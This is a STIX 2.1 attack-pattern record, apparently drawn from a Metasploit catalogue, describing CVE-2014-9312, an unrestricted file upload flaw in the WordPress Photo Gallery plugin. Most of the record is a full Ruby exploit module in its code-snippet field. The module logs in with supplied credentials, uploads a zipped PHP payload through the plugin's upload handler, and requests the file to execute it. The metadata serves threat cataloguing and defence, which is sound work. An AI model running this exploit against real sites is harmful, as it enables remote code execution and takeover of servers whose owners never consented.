{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--14ac4a5b-baae-4ced-bc75-95d359b361b5",
    "created": "2024-08-14T17:13:50.332392Z",
    "modified": "2024-08-14T17:13:50.332396Z",
    "name": "WordPress Photo Gallery Unrestricted File Upload",
    "description": "Photo Gallery Plugin for WordPress contains a flaw that allows a remote attacker to execute arbitrary PHP code. This flaw exists because the photo-gallery\\photo-gallery.php script allows access to filemanager\\UploadHandler.php. The post() method in UploadHandler.php does not properly verify or sanitize user-uploaded files.  This module was tested on version 1.2.5. 'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_photo_gallery_unrestricted_file_upload.rb",
            "external_id": "wp_photo_gallery_unrestricted_file_upload.rb"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7769"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-9312"
        },
        {
            "source_name": "reference",
            "url": "http://security.szurek.pl/photo-gallery-125-unrestricted-file-upload.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\nrequire 'json'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'            => 'WordPress Photo Gallery Unrestricted File Upload',\n      'Description'     => %q{Photo Gallery Plugin for WordPress contains a flaw that allows a\n                              remote attacker to execute arbitrary PHP code. This flaw exists\n                              because the photo-gallery\\photo-gallery.php script allows access\n                              to filemanager\\UploadHandler.php. The post() method in UploadHandler.php\n                              does not properly verify or sanitize user-uploaded files.\n\n                              This module was tested on version 1.2.5.},\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Kacper Szurek', # Vulnerability disclosure\n          'rastating'      # Metasploit module\n        ],\n      'References'      =>\n        [\n          ['OSVDB', '117676'],\n          ['WPVDB', '7769'],\n          ['CVE', '2014-9312'],\n          ['URL', 'http://security.szurek.pl/photo-gallery-125-unrestricted-file-upload.html']\n        ],\n      'DisclosureDate'  => '2014-11-11',\n      'Platform'        => 'php',\n      'Arch'            => ARCH_PHP,\n      'Targets'         => [['photo-gallery < 1.2.6', {}]],\n      'DefaultTarget'   => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('USERNAME', [true, 'The username to authenticate with']),\n        OptString.new('PASSWORD', [true, 'The password to authenticate with'])\n      ])\n  end\n\n  def check\n    check_plugin_version_from_readme('photo-gallery', '1.2.6')\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def generate_mime_message(payload, name)\n    data = Rex::MIME::Message.new\n    zip = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)\n    zip.add_file(\"#{name}.php\", payload.encoded)\n    data.add_part(zip.pack, 'application/x-zip-compressed', 'binary', \"form-data; name=\\\"files\\\"; filename=\\\"#{name}.zip\\\"\")\n    data\n  end\n\n  def exploit\n    print_status(\"Authenticating using #{username}:#{password}...\")\n    cookie = wordpress_login(username, password)\n    fail_with(Failure::NoAccess, 'Failed to authenticate with WordPress') if cookie.nil?\n    print_good(\"Authenticated with WordPress\")\n    store_valid_credential(user: username, private: password, proof: cookie)\n\n    print_status(\"Preparing payload...\")\n    payload_name = Rex::Text.rand_text_alpha(10)\n    data = generate_mime_message(payload, payload_name)\n\n    upload_dir = \"#{Rex::Text.rand_text_alpha(5)}/\"\n    print_status(\"Uploading payload to #{upload_dir}...\")\n    res = send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => wordpress_url_admin_ajax,\n      'vars_get'  => { 'action' => 'bwg_UploadHandler', 'dir' => upload_dir },\n      'ctype'     => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'      => data.to_s,\n      'cookie'    => cookie\n    )\n\n    fail_with(Failure::Unreachable, 'No response from the target') if res.nil?\n    fail_with(Failure::UnexpectedReply, \"Server responded with status code #{res.code}\") if res.code != 200\n    print_good(\"Uploaded the payload\")\n\n    print_status(\"Parsing server response...\")\n    begin\n      json = JSON.parse(res.body)\n      if json.nil? || json['files'].nil? || json['files'][0].nil? || json['files'][0]['name'].nil?\n        fail_with(Failure::UnexpectedReply, 'Unable to parse the server response')\n      else\n        uploaded_name = json['files'][0]['name'][0..-5]\n        php_file_name = \"#{uploaded_name}.php\"\n        payload_url = normalize_uri(wordpress_url_backend, upload_dir, uploaded_name, php_file_name)\n        print_good(\"Parsed response\")\n\n        register_files_for_cleanup(php_file_name)\n        register_files_for_cleanup(\"../#{uploaded_name}.zip\")\n        print_status(\"Executing the payload at #{payload_url}\")\n        send_request_cgi(\n        {\n          'uri'     => payload_url,\n          'method'  => 'GET'\n        }, 5)\n        print_good(\"Executed payload\")\n      end\n    rescue\n      fail_with(Failure::UnexpectedReply, 'Unable to parse the server response')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-11-11",
    "x_mitre_platforms": [
        "php'"
    ]
}